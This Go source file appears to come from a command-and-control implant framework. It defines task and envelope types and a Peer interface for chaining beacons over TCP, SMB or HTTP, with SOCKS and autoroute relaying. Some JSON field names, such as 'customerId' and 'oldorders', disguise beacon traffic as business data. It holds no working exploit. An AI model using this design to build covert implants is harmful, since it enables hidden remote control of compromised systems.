package utils

// Redeclaring types here to avoid protojson and protbuf in implant (big size)
type Task struct {
	TaskId    string `json:"taskId"`
	BeacondId string `json:"customerId"`
	State     string `json:"state"`
	Command   string `json:"command"`
	Reqdata   []byte `json:"reqdata"`
	Response  []byte `json:"response"`
	SentAt    string `json:"sendAt"`
}
type Tasks struct {
	BeaconId string `json:"customerId"`
	Tasks    []Task `json:"tasks"`
}

// Maybe usefull for later
type Envelope struct {
	TypeEnv  string   `json:"type"`
	EnvId string   `json:"customerId"`
	Chain    []string `json:"oldorders"`
	EnvData  []byte   `json:"data"`
}

// Peer Interface
// It represent a Beacon (parent _including orsted server_ or child )
// It also wxpose ways to talk with Beacon and relay traffic
type Peer interface {
    // Compare the Peer to current Beacon - Return Child or Parent
    GetPeerLevel() string

    // Compare Peer connection to Current Beacon - Return TCP SMB or HTTP (for server)
    GetPeerType() string 

    // Get Peer (same as Beacon ID) (0 for Server, -1 for pending)
    GetPeerID() string

    // Set Peer Id (same as Beacon ID) (used because Server decide Beacon Id)
    SetPeerID(string) string

    // Used by current beacon to send Data to Peer and get response
    // Pure networking stuff - doesn't add encryption, doesn't 
    // know logic
    SendRequest(dataToSend []byte) ([]byte, error) 

    // Prepare Register Beacon Data Envelope along with special
    // protocol headers and delimiter
    // If Current Beacon want to register it self and talk with this peer,
    // it need to prepare data
    PrepareRegisterBeaconData(rawEnvelope []byte) ([]byte, error)

    // Prepare Retreive Tasks Envelope - like Register Beacon but 
    // to get tasks
    PrepareRetreiveTasksData(rawEnvelope []byte) ([]byte, error)

    // Same as above
    PrepareSendTaskResultsData(rawEnvelope []byte) ([]byte, error)

    // Same as above
    PrepareSocksData(rawEnvelope []byte) ([]byte, error)

    // Same as above
    PrepareAutorouteData(rawEnvelope []byte) ([]byte, error)

    // Some Protcol (ex HTTP chuncked, TCP delimiter etc) add some 
    // encoding to byte (resp or req).
    // This is used to clean those
    CleanReqFromPeerProtocol(data []byte) (rawEnvelope []byte, err error)
    CleanRespFromPeerProtocol(data []byte) (rawEnvelope []byte, err error)

}

// Function to send result back
type ResultSender func(p Peer, taskId string, state string, restype string, response []byte) error
